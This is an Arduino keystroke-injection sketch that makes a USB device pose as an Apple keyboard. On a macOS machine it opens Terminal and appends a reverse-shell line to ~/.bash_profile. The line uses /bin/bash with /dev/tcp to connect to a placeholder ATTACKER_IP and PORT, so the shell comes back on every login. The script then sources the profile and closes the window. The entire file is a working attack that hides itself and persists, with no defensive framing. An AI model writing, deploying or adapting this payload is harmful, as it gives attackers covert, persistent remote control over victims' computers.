#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup(){
  Keyboard.begin();
  delay(1000);

  // Inject reverse shell into bash profile
  // Author: Generated
  // Title: Bash Profile Inject
  // Target: macOS
  // Version: 1.0
  // Category: Persistence
  // ID 05ac:021e Apple:Keyboard
  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("terminal");

  delay(500);

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("echo 'if [ -z \"$SSH_TTY\" ]; then (sleep 5 && /bin/bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1) & fi' >> ~/.bash_profile");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("source ~/.bash_profile");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("echo 'Profile inject complete'");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('w');
  Keyboard.releaseAll();

  Keyboard.end();
}

void loop() {}